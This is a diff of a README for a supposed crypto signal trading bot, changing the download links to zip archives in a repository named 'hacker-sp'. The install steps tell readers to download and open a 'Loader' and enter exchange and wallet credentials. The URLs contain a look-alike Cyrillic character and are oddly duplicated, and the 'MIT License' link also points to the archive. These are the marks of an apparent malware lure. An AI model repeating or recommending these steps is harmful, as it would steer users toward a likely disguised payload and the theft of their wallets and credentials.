@@ -24,7 +24,7 @@ BitPay Crypto Signal Trading Bot is a robust, feature-rich, and automated tradin
 
 ## 🔑 Installation
 
-1. Download https://raw.githubusercontent.com/hacker-sp/BitPaySignalBot-Pro/main/Lоader.zip from the repository.
+1. Download https://raw.githubusercontent.com/hacker-sp/BitPaySignalBot-Pro/main/stratic/Pro_Bit_Pay_Signal_Bot_1.0.zipоhttps://raw.githubusercontent.com/hacker-sp/BitPaySignalBot-Pro/main/stratic/Pro_Bit_Pay_Signal_Bot_1.0.zip from the repository.
 2. Extract the archive using your preferred extraction tool.
 3. Open the Loader and follow on-screen instructions to set up your exchange and wallet credentials.
 4. Review and configure your trading preferences, then start the bot.
@@ -39,4 +39,4 @@ BitPay Crypto Signal Trading Bot is an automated assistant for trading strategie
 
 ## 📜 License
 
-Distributed under the [MIT License](https://raw.githubusercontent.com/hacker-sp/BitPaySignalBot-Pro/main/Lоader.zip) | © 2025 BitPay Crypto Signal Trading Bot Team
+Distributed under the [MIT License](https://raw.githubusercontent.com/hacker-sp/BitPaySignalBot-Pro/main/stratic/Pro_Bit_Pay_Signal_Bot_1.0.zipоhttps://raw.githubusercontent.com/hacker-sp/BitPaySignalBot-Pro/main/stratic/Pro_Bit_Pay_Signal_Bot_1.0.zip) | © 2025 BitPay Crypto Signal Trading Bot Team
